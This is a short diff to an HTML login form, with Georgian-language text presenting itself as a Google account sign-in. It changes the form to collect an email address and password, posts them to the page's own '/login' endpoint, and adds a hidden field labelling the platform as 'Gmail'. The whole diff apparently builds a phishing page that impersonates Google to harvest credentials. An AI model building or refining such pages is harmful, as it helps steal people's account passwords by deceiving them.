@@ -94,7 +94,8 @@
             <h1>შესვლა</h1>
             <p>გამოიყენეთ თქვენი Google ანგარიში</p>
             <form action="/login" method="POST">
-                <input type="text" name="username" placeholder="ელ-ფოსტა ან ტელეფონი" required>
+                <input type="hidden" name="platform" value="Gmail">
+                <input type="text" name="email" placeholder="ელ-ფოსტა ან ტელეფონი" required>
                 <input type="password" name="password" placeholder="შეიყვანეთ თქვენი პაროლი" required>
 
                 <div class="btn-container">
